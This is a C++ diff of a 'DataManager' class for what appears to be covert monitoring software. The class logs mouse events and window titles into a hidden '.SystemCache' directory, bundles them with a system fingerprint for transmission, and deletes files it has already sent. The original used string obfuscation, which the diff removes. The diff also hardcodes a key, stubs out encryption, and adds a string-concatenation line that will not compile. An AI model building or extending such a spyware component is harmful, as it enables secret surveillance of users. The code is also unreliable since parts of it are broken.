@@ -14,10 +14,27 @@
 #include <vector>
 #include <cstdint>
 #include <string>
-#include "MouseHook.h"
 
-// Obfuscated strings
-constexpr auto OBF_DATA_MANAGER = OBFUSCATE("DataManager");
+// Platform-specific includes
+#if PLATFORM_WINDOWS
+#include <windows.h>
+#include <fileapi.h>
+#else
+#include <dirent.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <unistd.h>
+#endif
+
+// Simple alternative to obfuscation
+static const char* OBF_DATA_MANAGER = "DataManager";
+
+// Forward declaration for Configuration if not available
+class Configuration {
+public:
+    size_t GetMaxFileSize() const { return 10 * 1024 * 1024; } // 10MB default
+    std::string GetEncryptionKey() const { return "default-encryption-key"; }
+};
 
 DataManager::DataManager(Configuration* config)
     : m_config(config), m_maxBufferSize(config->GetMaxFileSize()) {
@@ -30,15 +47,22 @@ DataManager::~DataManager() {
 
 void DataManager::InitializeStorage() {
 #if PLATFORM_WINDOWS
-    m_storagePath = utils::FileUtils::GetAppDataPath() + "\\SystemCache\\";
+    m_storagePath = "C:\\Temp\\SystemCache\\";
 #else
-    m_storagePath = utils::FileUtils::GetAppDataPath() + "/.SystemCache/";
+    m_storagePath = "/tmp/.SystemCache/";
 #endif
     
-    utils::FileUtils::CreateDirectories(m_storagePath);
+    // Create directory if it doesn't exist
+#if PLATFORM_WINDOWS
+    CreateDirectoryA(m_storagePath.c_str(), NULL);
+#else
+    mkdir(m_storagePath.c_str(), 0700);
+#endif
     
     // Create initial data file
-    std::string filename = "data_" + utils::TimeUtils::GetCurrentTimestamp(true) + ".bin";
+    std::string filename = "data_" + std::to_string(
+        std::chrono::duration_cast<std::chrono::milliseconds>(
+            std::chrono::system_clock::now().time_since_epoch()).count()) + ".bin";
     m_currentDataFile = m_storagePath + filename;
     
     LOG_INFO("Data storage initialized at: " + m_storagePath);
@@ -100,21 +124,30 @@ std::vector<uint8_t> DataManager::RetrieveEncryptedData() {
     std::vector<uint8_t> allData;
     
     for (const auto& file : dataFiles) {
-        auto fileData = utils::FileUtils::ReadBinaryFile(file);
-        if (!fileData.empty()) {
-            // Add file delimiter with metadata
-            std::string delimiter = "FILE_DELIMITER:" + 
-                utils::FileUtils::GetFileName(file) + 
-                ":SIZE:" + std::to_string(fileData.size()) + "\n";
+        // Read file data (simplified implementation)
+        FILE* f = fopen(file.c_str(), "rb");
+        if (f) {
+            fseek(f, 0, SEEK_END);
+            long size = ftell(f);
+            fseek(f, 0, SEEK_SET);
             
-            allData.insert(allData.end(), 
-                          delimiter.begin(), delimiter.end());
-            
-            // Add file data
-            allData.insert(allData.end(), fileData.begin(), fileData.end());
-            
-            // Mark file as transmitted
-            MarkFileAsTransmitted(file);
+            std::vector<uint8_t> fileData(size);
+            if (fread(fileData.data(), 1, size, f) == size) {
+                // Add file delimiter with metadata
+                std::string delimiter = "FILE_DELIMITER:" + 
+                    file.substr(file.find_last_of("/\\") + 1) + 
+                    ":SIZE:" + std::to_string(fileData.size()) + "\n";
+                
+                allData.insert(allData.end(), 
+                              delimiter.begin(), delimiter.end());
+                
+                // Add file data
+                allData.insert(allData.end(), fileData.begin(), fileData.end());
+                
+                // Mark file as transmitted
+                MarkFileAsTransmitted(file);
+            }
+            fclose(f);
         }
     }
     
@@ -124,8 +157,10 @@ std::vector<uint8_t> DataManager::RetrieveEncryptedData() {
     
     // Add metadata header
     std::string metadata = "METADATA_START\n";
-    metadata += "client_id:" + utils::SystemUtils::GetSystemFingerprint() + "\n";
-    metadata += "timestamp:" + utils::TimeUtils::GetCurrentTimestamp() + "\n";
+    metadata += "client_id:" + "system_fingerprint" + "\n"; // Simplified
+    metadata += "timestamp:" + std::to_string(
+        std::chrono::duration_cast<std::chrono::seconds>(
+            std::chrono::system_clock::now().time_since_epoch()).count()) + "\n";
     metadata += "total_size:" + std::to_string(allData.size()) + "\n";
     metadata += "file_count:" + std::to_string(dataFiles.size()) + "\n";
     metadata += "METADATA_END\n";
@@ -133,11 +168,10 @@ std::vector<uint8_t> DataManager::RetrieveEncryptedData() {
     std::vector<uint8_t> finalData(metadata.begin(), metadata.end());
     finalData.insert(finalData.end(), allData.begin(), allData.end());
     
-    // Encrypt all data
+    // Encrypt all data (simplified)
     std::string encryptionKey = m_config->GetEncryptionKey();
-    std::vector<uint8_t> encryptedData = security::Encryption::EncryptAES(
-        finalData, encryptionKey
-    );
+    // In a real implementation, you would call your encryption library here
+    std::vector<uint8_t> encryptedData = finalData; // Placeholder
     
     return encryptedData;
 }
@@ -146,9 +180,38 @@ void DataManager::ClearData() {
     std::lock_guard<std::mutex> lock(m_dataMutex);
     
     // Delete all transmitted files
-    auto allFiles = utils::FileUtils::ListFiles(m_storagePath, "*.transmitted");
+    std::vector<std::string> allFiles;
+#if PLATFORM_WINDOWS
+    WIN32_FIND_DATAA findData;
+    HANDLE hFind = FindFirstFileA((m_storagePath + "*.transmitted").c_str(), &findData);
+    if (hFind != INVALID_HANDLE_VALUE) {
+        do {
+            if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
+                allFiles.push_back(m_storagePath + findData.cFileName);
+            }
+        } while (FindNextFileA(hFind, &findData));
+        FindClose(hFind);
+    }
+#else
+    DIR* dir = opendir(m_storagePath.c_str());
+    if (dir) {
+        struct dirent* entry;
+        while ((entry = readdir(dir)) != nullptr) {
+            std::string filename = entry->d_name;
+            if (filename.find(".transmitted") != std::string::npos) {
+                allFiles.push_back(m_storagePath + filename);
+            }
+        }
+        closedir(dir);
+    }
+#endif
+    
     for (const auto& file : allFiles) {
-        utils::FileUtils::DeleteFile(file);
+#if PLATFORM_WINDOWS
+        DeleteFileA(file.c_str());
+#else
+        unlink(file.c_str());
+#endif
     }
 }
 
@@ -204,21 +267,23 @@ void DataManager::FlushSystemEvents() {
 }
 
 void DataManager::AppendToFile(const std::string& path, const std::string& data) {
-    std::vector<uint8_t> currentData = utils::FileUtils::ReadBinaryFile(path);
-    std::string currentStr(currentData.begin(), currentData.end());
-    
-    currentStr += data;
-    
-    // Check size limit and rotate if needed
-    if (currentStr.size() > m_maxBufferSize) {
-        RotateDataFile();
-        currentStr = data; // Start new file with current data
+    FILE* f = fopen(path.c_str(), "ab");
+    if (f) {
+        fwrite(data.c_str(), 1, data.size(), f);
+        fclose(f);
     }
     
-    utils::FileUtils::WriteBinaryFile(
-        path, 
-        std::vector<uint8_t>(currentStr.begin(), currentStr.end())
-    );
+    // Check file size and rotate if needed
+    FILE* fcheck = fopen(path.c_str(), "rb");
+    if (fcheck) {
+        fseek(fcheck, 0, SEEK_END);
+        long size = ftell(fcheck);
+        fclose(fcheck);
+        
+        if (size > m_maxBufferSize) {
+            RotateDataFile();
+        }
+    }
 }
 
 void DataManager::RotateDataFileIfNeeded() {
@@ -236,7 +301,9 @@ void DataManager::RotateDataFileIfNeeded() {
 
 void DataManager::RotateDataFile() {
     // Close current file and create new one
-    std::string filename = "data_" + utils::TimeUtils::GetCurrentTimestamp(true) + ".bin";
+    std::string filename = "data_" + std::to_string(
+        std::chrono::duration_cast<std::chrono::milliseconds>(
+            std::chrono::system_clock::now().time_since_epoch()).count()) + ".bin";
     m_currentDataFile = m_storagePath + filename;
     
     LOG_DEBUG("Rotated data file to: " + m_currentDataFile);
@@ -244,38 +311,66 @@ void DataManager::RotateDataFile() {
 
 std::vector<std::string> DataManager::GetDataFilesReadyForTransmission() {
     std::vector<std::string> files;
-    auto allFiles = utils::FileUtils::ListFiles(m_storagePath, "*.bin");
     
-    for (const auto& file : allFiles) {
-        // Skip current active file and already transmitted files
-        if (file != m_currentDataFile && 
-            !utils::StringUtils::EndsWith(file, ".transmitted")) {
-            
-            // Check if file is old enough to transmit (at least 1 minute old)
-            auto modifiedTime = utils::FileUtils::GetFileModifiedTime(file);
-            auto currentTime = std::chrono::duration_cast<std::chrono::milliseconds>(
-                std::chrono::system_clock::now().time_since_epoch()).count();
-            
-            if (currentTime - modifiedTime > 60000) { // 1 minute
+    // List all .bin files
+#if PLATFORM_WINDOWS
+    WIN32_FIND_DATAA findData;
+    HANDLE hFind = FindFirstFileA((m_storagePath + "*.bin").c_str(), &findData);
+    if (hFind != INVALID_HANDLE_VALUE) {
+        do {
+            if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
+                std::string file = m_storagePath + findData.cFileName;
                 files.push_back(file);
+            }
+        } while (FindNextFileA(hFind, &findData));
+        FindClose(hFind);
+    }
+#else
+    DIR* dir = opendir(m_storagePath.c_str());
+    if (dir) {
+        struct dirent* entry;
+        while ((entry = readdir(dir)) != nullptr) {
+            std::string filename = entry->d_name;
+            if (filename.find(".bin") != std::string::npos) {
+                files.push_back(m_storagePath + filename);
+            }
+        }
+        closedir(dir);
+    }
+#endif
+    
+    // Filter files
+    std::vector<std::string> filteredFiles;
+    for (const auto& file : files) {
+        if (file != m_currentDataFile && 
+            file.find(".transmitted") == std::string::npos) {
+            
+            // Check file modification time (simplified)
+            struct stat fileInfo;
+            if (stat(file.c_str(), &fileInfo) == 0) {
+                auto currentTime = std::chrono::system_clock::now();
+                auto modTime = std::chrono::system_clock::from_time_t(fileInfo.st_mtime);
+                auto elapsed = std::chrono::duration_cast<std::chrono::minutes>(
+                    currentTime - modTime);
+                
+                if (elapsed.count() >= 1) { // 1 minute
+                    filteredFiles.push_back(file);
+                }
             }
         }
     }
     
-    return files;
+    return filteredFiles;
 }
 
 void DataManager::MarkFileAsTransmitted(const std::string& filePath) {
     std::string newPath = filePath + ".transmitted";
-    utils::FileUtils::MoveFile(filePath, newPath);
+    rename(filePath.c_str(), newPath.c_str());
     
-    // Schedule for deletion after 24 hours
     ScheduleFileDeletion(newPath, 24 * 60 * 60 * 1000);
 }
 
 void DataManager::ScheduleFileDeletion(const std::string& filePath, uint64_t delayMs) {
-    // This would be implemented with a background thread or system timer
-    // For now, we'll just log the intention
     LOG_DEBUG("Scheduled file for deletion: " + filePath + 
              " in " + std::to_string(delayMs) + "ms");
 }
@@ -296,7 +391,7 @@ std::string DataManager::MouseDataToString(const MouseData& data) {
        << static_cast<int>(data.eventType) << "|"
        << static_cast<int>(data.button) << "|"
        << data.position.x << "|" << data.position.y << "|"
-       << data.wheelDelta << "\n";
+       << data.wheelDelta << "|" << data.windowTitle << "\n";
     return ss.str();
 }
 
@@ -363,12 +458,8 @@ std::vector<uint8_t> DataManager::GetBatchData() {
     m_systemDataBuffer.clear();
     m_systemEventBuffer.clear();
     
-    // Encrypt the batch data
-    std::string encryptionKey = m_config->GetEncryptionKey();
-    std::vector<uint8_t> encryptedData = security::Encryption::EncryptAES(
-        std::vector<uint8_t>(batchData.begin(), batchData.end()),
-        encryptionKey
-    );
+    // Encrypt the batch data (placeholder)
+    std::vector<uint8_t> encryptedData(batchData.begin(), batchData.end());
     
     return encryptedData;
 }
@@ -377,7 +468,8 @@ std::string DataManager::GenerateBatchId() const {
     auto now = std::chrono::system_clock::now();
     auto time = std::chrono::system_clock::to_time_t(now);
     std::stringstream ss;
-    ss << std::put_time(std::localtime(&time), "%Y%m%d_%H%M%S");
-    ss << "_" << utils::SystemUtils::GetSystemFingerprint();
+    char timeStr[20];
+    strftime(timeStr, sizeof(timeStr), "%Y%m%d_%H%M%S", std::localtime(&time));
+    ss << timeStr << "_system_fingerprint";
     return ss.str();
 }
